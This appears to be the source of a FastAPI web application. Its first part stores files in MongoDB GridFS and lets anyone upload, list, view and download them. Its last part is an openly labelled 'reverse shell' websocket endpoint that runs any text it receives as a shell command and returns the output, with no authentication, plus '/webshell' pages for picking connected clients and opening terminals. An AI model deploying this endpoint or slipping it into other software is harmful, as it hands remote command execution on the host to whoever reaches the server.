from fastapi import FastAPI, File, HTTPException, UploadFile, Request, WebSocket
from fastapi.responses import HTMLResponse, StreamingResponse
from gridfs import GridFS
from pymongo import MongoClient
from pydantic import BaseModel
from fastapi.templating import Jinja2Templates
import aiosubprocess
import websockets
import subprocess
import os

app = FastAPI()

templates = Jinja2Templates(directory="templates")  # Create a templates directory

# Initialize the MongoDB client
client = MongoClient("mongodb://mongo:27017/")
db = client["mydatabase"]
connections = db["connections"]
fs = GridFS(db)

class FileResponse(BaseModel):
    filename: str

# index route
@app.get('/')
async def index(request: Request):
    return templates.TemplateResponse('index.html', {'request': request})

# render the upload form in an HTML template
@app.post('/upload')
async def upload_file(file: UploadFile = File(...)):
    if not file:
        return {'error': 'No file part'}

    if file.filename == '':
        return {'error': 'No selected file'}

    # Save the file to MongoDB GridFS
    with fs.new_file(filename=file.filename) as grid_file:
        grid_file.write(file.file.read())

    return {'message': 'File uploaded successfully', 'filename': file.filename}

# render the upload form in an HTML template
@app.get('/list-files')
async def list_files():
    file_list = []  # This will store a list of files and directories

    # Query MongoDB's GridFS for a list of files
    for grid_file in fs.find():
        file_list.append(grid_file.filename)

    return file_list

# render the file list in an HTML template
@app.get('/list-files-view')
async def list_files_view(request: Request):
    file_list = await list_files()
    return templates.TemplateResponse('list_files.html', {'request': request, 'file_list': file_list})

# render the file content in an HTML template
@app.get('/file/{filename}')
async def file_content(request: Request, filename: str):
    # Retrieve the file content from MongoDB GridFS
    grid_file = fs.find_one({"filename": filename})
    if not grid_file:
        return HTMLResponse(content="File not found", status_code=404)

    # Check if the file has a supported file extension
    supported_extensions = ['.txt', '.pdf', '.conf', '.json']
    file_extension = os.path.splitext(filename)[1]
    if file_extension not in supported_extensions:
        return templates.TemplateResponse('unsupported_file.html', {'request': request, 'filename': filename})

    content = grid_file.read()

    # Render the content in an HTML template
    return templates.TemplateResponse('file_content.html', {'request': request, 'filename': filename, 'content': content.decode()})

# download the file
@app.get('/download/{filename}')
async def download_file(filename: str):
    # Retrieve the file content from MongoDB GridFS
    grid_file = fs.find_one({"filename": filename})
    if not grid_file:
        return HTMLResponse(content="File not found", status_code=404)

    # Return the file data as a response
    return StreamingResponse(grid_file, media_type='application/octet-stream')

# websocket endpoint for reverse shell
@app.websocket("/ws/{client_id}")
async def websocket_endpoint(websocket: WebSocket, client_id: int):
    if connections.find_one({"client_id": client_id}):
        raise HTTPException(status_code=400, detail="Client ID is already in use")
    await websocket.accept()
    connections.insert_one({"client_id": client_id})
    try:
        while True:
            data = await websocket.receive_text()
            process = await aiosubprocess.create_subprocess_shell(data, stdout=aiosubprocess.PIPE, stderr=aiosubprocess.PIPE)
            stdout, stderr = await process.communicate()
            await websocket.send_text(stdout.decode())
    except:
        connections.delete_one({"client_id": client_id})

@app.get('/webshell')
async def webshell(request: Request):
    active_connections = [doc["client_id"] for doc in connections.find()]
    return templates.TemplateResponse('reverse_shell.html', {'request': request, 'active_connections': active_connections})

@app.get('/webshell/{client_id}')
async def webshell(request: Request, client_id: int):
    if not connections.find_one({"client_id": client_id}):
        raise HTTPException(status_code=400, detail="Client ID is not active")
    return templates.TemplateResponse('terminal.html', {'request': request, 'client_id': client_id})

